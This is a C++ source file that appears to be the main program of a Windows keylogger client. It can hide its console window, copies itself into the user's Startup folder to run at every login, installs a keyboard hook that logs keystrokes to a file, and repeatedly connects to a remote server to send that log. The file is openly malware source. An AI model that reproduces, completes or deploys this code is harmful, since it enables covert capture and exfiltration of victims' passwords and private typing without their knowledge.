#include "Communication/Communication.h"
#include "Hook/KeyboardHook.h"
#include <filesystem>
#include <thread>

namespace fs = std::filesystem;

void communication_with_server(std::string log){

	//Waits until trying another connection to the server
	while(true){

		sleep(10);

		SOCKET connection_socket = SetUpConnectionSocket();

    	if(connection_socket != -1){

			mtx.lock();

			Communicate_with_server(connection_socket, log);

			mtx.unlock();

		}
	}
}

int main(){

//This variable defines the logFile name
std::string log = "logFile.txt";

//This variable defines if the terminal is displayed while the keylogger is running
bool display_terminal = true;

	if(!display_terminal){
		ShowWindow( GetConsoleWindow(), SW_HIDE );
	}

	//Verify if the system is in EN-US to add the program to the startup directory
	//This can be improved
	if(GetUserDefaultUILanguage() != 1033){
		exit(EXIT_FAILURE);
	}

	fs::path startup = "C:/Users/" + std::string(std::getenv("USERNAME")) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

	if(!fs::equivalent(startup, fs::current_path())){
		startup += "Client.exe";
		rename("Client.exe", startup);
	}

    SetHook(log);

	std::thread communication_thread(communication_with_server,log);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)){

	}

}




